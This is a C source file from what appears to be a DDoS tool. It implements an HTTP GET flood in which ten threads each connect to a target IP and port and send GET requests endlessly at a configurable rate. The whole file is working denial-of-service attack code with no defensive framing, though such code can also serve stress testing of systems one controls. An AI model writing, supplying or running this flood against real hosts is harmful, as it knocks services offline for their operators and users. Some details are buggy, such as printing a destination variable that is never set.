#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../base/time_check.h"
#include "../ddos/get_flood.h"
#include "../base/subnet_mask.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"

// session counting
unsigned long g_get_num_total;
unsigned long g_get_num_generated_in_sec;
// from main()
char g_get_src_ip[16] = { 0, };
char g_get_dest_ip[16] = { 0, };
unsigned int g_get_src_mask;
unsigned int g_get_dest_mask;
unsigned int g_get_dest_port_start;
unsigned int g_get_dest_port_end;
unsigned int g_get_request_per_sec;
// for masking next ip address
char g_get_now_src_ip[16] = { 0, };
char g_get_now_dest_ip[16] = { 0, };
unsigned int g_get_now_dest_port;
// thread
pthread_mutex_t g_get_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_get_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_get_before_time;
struct timespec g_get_now_time;
// request msg
char g_get_request_msg[__GET_REQUEST_MSG_SIZE__ ];

void get_flood_print_usage(void)
{
	printf("get flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_get_flood(void *data)
{
	int thread_id = *((int*)data);
	// make tcp connection
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1) {
		perror("sock creation failed\n");
	}
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(g_get_dest_ip);
	servaddr.sin_port = htons(g_get_dest_port_start);
	if (connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
		perror("connect failed\n");
	}
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_get_mutex);
		// wait a second
		if (g_get_num_generated_in_sec >= g_get_request_per_sec) {
			pthread_cond_wait(&g_get_cond, &g_get_mutex);
		}
		// time checking
		time_check(&g_get_mutex, &g_get_cond, &g_get_before_time, &g_get_now_time, &g_get_num_generated_in_sec);
		// send packet
		send(sock, g_get_request_msg, strlen(g_get_request_msg), 0);
		g_get_num_generated_in_sec++;
		g_get_num_total++;
		//printf("%lu Get msg sent\n", g_get_num_generated_in_sec);
		// *** end of critical section ***
		pthread_mutex_unlock(&g_get_mutex);
	}
	return NULL;
}

void *get_flood_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_get_mutex);
		time_check(&g_get_mutex, &g_get_cond, &g_get_before_time, &g_get_now_time, &g_get_num_generated_in_sec);
		pthread_mutex_unlock(&g_get_mutex);
	}
	return NULL;
}

void get_flood_main(char *argv[])
{
	/*
		 Will be implemented Later....
		 FILE *get_f;
		 get_f=fopen("./src/ddos/http_request.txt","rb");
		 if(get_f==NULL)
		 {
		 perror("open error! does http_g_get_request_msg.txt exist?\n");
		 exit(1);
		 }
		 char buffer[__GET_REQUEST_MSG_SIZE__];
		 while(fgets(buffer,__GET_REQUEST_MSG_SIZE__,get_f)!=NULL)
		 {
		 strcat(g_get_request_msg,buffer);
		 strcat(g_get_request_msg,"\r\n");
		 }
		 strcat(g_get_request_msg,"\r\n");
		 fclose(get_f);
	 */
	strcpy(g_get_request_msg, GET_METHOD);
	printf("Requesting: \n%s\n", g_get_request_msg);
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		get_flood_print_usage();
		return;
	}
	split_ip_mask_port(argv,
			g_get_src_ip,
			g_get_dest_ip,
			&g_get_src_mask,
			&g_get_dest_mask,
			&g_get_dest_port_start,
			&g_get_dest_port_end);
	g_get_num_generated_in_sec = 0;
	g_get_num_total = 0;
	memset(&g_get_before_time, 0, sizeof(struct timespec));
	memset(&g_get_now_time, 0, sizeof(struct timespec));
	g_get_request_per_sec = atoi(argv[3]);
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending GET requests to %s using %d threads %u per sec\n", g_get_now_dest_ip, num_threads, g_get_request_per_sec);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_get_flood, (void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, get_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	pthread_mutex_destroy(&g_get_mutex);
	printf("GET flood finished\nTotal %lu packets sent.\n", g_get_num_total);
	pthread_exit(NULL);
	return;
}
